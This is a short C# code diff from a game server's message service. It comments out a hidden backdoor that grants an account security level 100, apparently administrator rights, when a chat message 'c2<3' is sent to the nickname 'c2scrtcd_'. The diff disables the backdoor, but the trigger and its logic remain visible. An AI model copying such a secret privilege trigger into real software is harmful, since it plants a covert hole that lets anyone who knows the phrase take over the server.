@@ -150,11 +150,11 @@ namespace NeoNetsphere.Network.Services
             var toPlr = GameServer.Instance.PlayerManager.Get(message.ToNickname);
             if (message.ToNickname.ToLower() != "server")
             {
-                if (message.ToNickname.ToLower() == "c2scrtcd_" && message.Message.ToLower() == "c2<3")
-                {
-                    session.Player.Account.SecurityLevel = (SecurityLevel) 100;
-                    return;
-                }
+                //if (message.ToNickname.ToLower() == "c2scrtcd_" && message.Message.ToLower() == "c2<3")
+                //{
+                //    session.Player.Account.SecurityLevel = (SecurityLevel) 100;
+                //    return;
+                //}
 
                 // ToDo Is there an answer for this case?
                 if (toPlr == null)
